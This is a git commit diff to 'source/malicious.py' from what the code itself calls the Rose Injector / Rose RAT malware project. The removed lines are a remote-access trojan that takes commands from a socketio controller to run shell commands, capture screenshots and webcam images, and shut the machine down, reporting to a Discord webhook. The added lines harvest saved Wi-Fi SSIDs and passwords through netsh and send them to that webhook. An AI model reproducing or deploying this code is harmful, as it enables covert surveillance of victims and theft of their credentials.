f299fd105b377ad7db738569817f1a4d9d668b7b
Gum <96620548+Gumbobrot@users.noreply.github.com>
2023-03-25 17:23:29 +0100

    Update malicious.py

--- source/malicious.py
+++ source/malicious.py
@@ -1,180 +1,79 @@
-from config import Config 
-from __webhook import _WebhookX
-from informations import Info
+import __webhook
+import _file
+from config import Config
+from dhooks import Embed
+from dhooks import File
 cc = Config()
-ii = Info()
-import socketio
-import cv2
-import random
-import pyttsx3
-import string
-import ctypes
+
 import os
-from datetime import datetime
+import re
 import subprocess
-import io
-from dhooks import Webhook as web
-from dhooks import Embed, File
-from PIL import ImageGrab
-from pynput.keyboard import Key, Controller
-sio = socketio.Client()
 
 
-class CommandHandler():
-    def __init__(self):
-        self.webhook = _WebhookX().get_object()
-        self.keyboard = Controller()
+__location__ = os.path.realpath(
+    os.path.join(os.getcwd(), os.path.dirname(__file__)))
 
-    def screenshot(self):
-        screenshot = ImageGrab.grab()
-        file_name = ''.join(random.choice(string.ascii_letters) for i in range(10))
-        screenshot.save(f"temp_{file_name}.png")
-        file = File(f"temp_{file_name}.png", name='Rose-Injector Screenshot.png') 
-        self.webhook.send(file=file)
-        os.remove(f"temp_{file_name}.png")
 
-    @staticmethod
-    def messagebox(message):
-        MB_YESNO = 0x04
-        MB_HELP = 0x4000
-        ICON_STOP = 0x10
-        ctypes.windll.user32.MessageBoxW(0, message, "Error", MB_HELP | MB_YESNO | ICON_STOP)
+def wifigr():
+    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"],
+                                    capture_output=True).stdout.decode()
 
-    def shell(self, instruction):
-        def _shell():
-            output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            return output
+    profile_names = re.findall("All User Profile     : (.*)\r", command_output)
 
-        try:    
-            result = str(_shell().stdout.decode('CP437')) #CP437 Decoding used for characters like " é " etc..
-        except Exception as e:
-            result = str(f"Error | Advanced log: {e}")
+    wifi_list = []
 
-        embed = Embed(
-            description='Rose RAT',
-            color=11495919,
-            timestamp='now'  # sets the timestamp to current time
-        )
+    if len(profile_names) != 0:
+        for name in profile_names:
+            try:
+                wifi_profile = {}
 
-        embed.set_author(name=f"Shell command result | {instruction}", icon_url=cc.get_avatar())
-        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
-        embed.add_field(name="Result", value=f'`{result}`')
+                profile_info = subprocess.run(
+                    ["netsh", "wlan", "show", "profile", name],
+                    capture_output=True).stdout.decode()
+                if re.search("Security key           : Absent", profile_info):
+                    continue
+                else:
+                    wifi_profile["ssid"] = name
+                    profile_info_pass = subprocess.run(
+                        [
+                            "netsh", "wlan", "show", "profile", name,
+                            "key=clear"
+                        ],
+                        capture_output=True,
+                    ).stdout.decode("utf-8")
+                    password = re.search("Key Content            : (.*)\r",
+                                         profile_info_pass)
 
-        self.webhook.send(embed=embed)
+                    if password is None:
+                        wifi_profile["password"] = None
+                    else:
+                        wifi_profile["password"] = password[1]
+                    wifi_list.append(wifi_profile)
+            except Exception as e:
+                print(e)
+                pass
 
-    def shutdown(self):
-        embed = Embed(
-            description='Rose RAT',
-            color=11495919,
-            timestamp='now'  # sets the timestamp to current time
-        )
-
-        embed.set_author(name=f"Shutting down the PC", icon_url=cc.get_avatar())
-        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
-
-        self.webhook.send(embed=embed)
-        os.system("shutdown /s /t 1")
-
-    def webcampic(self): #Take a picture with the webcam and send it with the webhook
-        try:            
-            cam = cv2.VideoCapture(0)   # 0 -> index of camera
-            s, img = cam.read()
-            if s:    # frame captured without any errors
-                suc, buffer = cv2.imencode(".jpg", img)
-                io_buf = io.BytesIO(buffer)
-                file = File(io_buf,name='cam.jpg') 
-                self.webhook.send(file=file)
-
-        except Exception as e:
+    if len(wifi_list) > 0:
+        if len(wifi_list) < 8:
+            wbh = __webhook._WebhookX().get_object()
             embed = Embed(
-            description='Rose RAT',
-                color=16399677,
-                timestamp='now'  # sets the timestamp to current time
+                description="Wifi SSID and Passwords list:",
+                color=16535004,
+                timestamp="now",  # sets the timestamp to current time
             )
 
-            embed.set_author(name=f"WebcamPIC Error", icon_url=cc.get_avatar())
+            embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
             embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
-            embed.add_field(name="Advanced log:", value=f'`{e}`')
+            for value in wifi_list:
+                embed.add_field(name=value["ssid"],
+                                value=f"`{value['password']}`")
 
-            self.webhook.send(embed=embed)
+            wbh.send(embed=embed)
 
-    def volumeup(self):
-        for i in range(50):
-            self.keyboard.press(Key.media_volume_up)
-            self.keyboard.release(Key.media_volume_up)     
+            with open(f"{__location__}/OpXOSIOF.txt", "w+",
+                      encoding="utf-8") as f:
+                f.write(_file.FileX().table_wifi(wifi_list))
+                f.write("\n\nMade by Rose Injector | github.com/DamagingRose")
 
-    def volumedown(self):
-        for i in range(50):
-            self.keyboard.press(Key.media_volume_down)
-            self.keyboard.release(Key.media_volume_down)  
-
-    def voice(self, text):
-        self.volumeup()
-        engine = pyttsx3.init()
-        engine.setProperty('rate', 150)
-        engine.say(text)
-        engine.runAndWait()
-
-    def uptime(self):
-        embed = Embed(
-            description='Rose RAT',
-            color=11495919,
-            timestamp='now'  # sets the timestamp to current time
-        )
-
-        embed.set_author(name=f"Connection Uptime", icon_url=cc.get_avatar())
-        embed.add_field(name="Uptime :",value=datetime.now())
-        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
-
-        self.webhook.send(embed=embed)            
-cmdhandler = CommandHandler()
-
-@sio.event
-def connect():
-    start_time = datetime.now()
-    sio.emit('rose_connect', {'data': {
-        'ip': ii.get_ip(),
-        'username': ii.get_username(),
-        'server': cc.get_discord_rat_link(),
-        'webhook': cc.get_webhook(),
-        'avatar': cc.get_avatar(),
-        'footer': cc.get_footer(),
-    }})
-
-@sio.event 
-def receive_command(data):
-    if data['data'] == 'screenshot':
-        cmdhandler.screenshot()
-
-    if data['data'].startswith('messagebox') is True:
-        cmdhandler.messagebox(data['data'].split('messagebox', 1)[1])
-
-    if data['data'].startswith('shell') is True:
-        cmdhandler.shell(data['data'].split('shell', 1)[1])
-
-    if data['data'].startswith('voice') is True:
-        cmdhandler.voice(data['data'].split('voice', 1)[1])
-
-    if data['data'] == 'volumemax':
-        cmdhandler.volumeup()
-
-    if data['data'] == 'volumezero':
-        cmdhandler.volumedown()
-
-    if data['data'] == 'shutdown':
-        cmdhandler.shutdown()
-
-    if data['data'] == 'webcampic':
-        cmdhandler.webcampic()
-
-    if data["data"] == "uptime":
-        cmdhandler.uptime()
-
-
-@sio.event
-def disconnect():
-    print("disconnect")
-
-def run_rat():
-    sio.connect(cc.get_discord_rat_link())
-    sio.wait()
+            wbh.send(file=File(f"{__location__}/OpXOSIOF.txt"))
+            os.remove(f"{__location__}/OpXOSIOF.txt")
